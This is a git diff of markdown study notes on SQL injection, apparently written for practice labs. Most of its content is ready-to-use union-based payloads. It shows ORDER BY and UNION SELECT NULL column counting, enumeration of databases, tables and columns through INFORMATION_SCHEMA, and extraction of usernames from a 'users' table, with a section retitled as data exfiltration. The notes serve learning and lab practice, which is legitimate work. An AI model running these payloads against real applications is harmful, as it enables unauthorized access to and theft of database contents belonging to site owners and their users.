@@ -11,11 +11,12 @@ look for syntax errors<br/>
 <br/><br/>
 2. **Union based**<br/>
 Counting number of columns 2methods <br/>
-1. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
+a. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
   ' ORDER BY 1--<br/>
   ' ORDER BY 2--<br/>
   ' ORDER BY 3--<br/>
-3. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
+  <br/>
+b. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
   ' UNION SELECT NULL--<br/>
   ' UNION SELECT NULL,NULL--<br/>
   ' UNION SELECT NULL,NULL,NULL--<br/>
@@ -40,21 +41,25 @@ Try replacing each null with the random value provided by the lab, for example:<
 '+UNION+SELECT+'abcdef',NULL,NULL--<br/>
 If an error occurs, move on to the next null and try that instead.<br/>
 <br/><br/>
-# determining number of tables found on the database and their names<br/>
+# Data exfiltration using union based quiries<br/>
 ### Listing Databases on the server<br/>
-``` 1'union+select+null,schema_name,null+FROM+INFORMATION_SCHEMA.SCHEMATA# ``` change the comment based on database to # or -- or /* **and** number of **null** values <br/>
+``` 1'union+select+null,schema_name,null+FROM+INFORMATION_SCHEMA.SCHEMATA# ```    change the comment based on database to # or -- or /* **and** number of **null** values <br/>
 
 ### Listing Tables inside database from above result <br/>
-``` 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='[database-name]'# ``` change the comment based on database to # or -- or /* **and** replace the database-name **and** number of **null** values <br/>
+``` 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='[database-name]'# ```     change the comment based on database to # or -- or /* **and** replace the database-name **and** number of **null** values <br/>
 **EX:** 1'union+select+null,table_name,null+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema='bankrobber'# <br/>
 
 ### Listing columns inside a table from above result <br/>
-``` 1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='[table-name]'+and+table_schema='[database-name]'# ```  change the comment based on database to # or -- or /* **and** replace the database-name & table-name **and** number of **null** values <br/>
+``` 1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='[table-name]'+and+table_schema='[database-name]'# ```     change the comment based on database to # or -- or /* **and** replace the database-name & table-name **and** number of **null** values <br/>
 **EX:**  1'union+select+null,column_name,null+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='users'+and+table_schema='bankrobber'# <br/>
 
 ### Listing data from the columns from a perticular database<br/>
-```1'union+select+null,[column-name],null+FROM+[database-name].[table-name]#``` change the comment based on database to # or -- or /* **and** replace the database-name & table-name & column-name **and** number of **null** values <br/>
+```1'union+select+null,[column-name],null+FROM+[database-name].[table-name]#```     change the comment based on database to # or -- or /* **and** replace the database-name & table-name & column-name **and** number of **null** values <br/>
+**or** 
+```1'union+select+null,[column-name],null+FROM+[table-name]#```    change the comment based on database to # or -- or /* **and** replace the table-name & column-name **and** number of **null** values<br/>
 **Ex:** 1'union+select+null,username,null+FROM+bankrobber.users# <br/>
+**Ex:** 1'union+select+null,username,null+FROM+users# <br/>
+
 
 <br/><br/>
 # 2. Blind or inferential sql injection<br/>
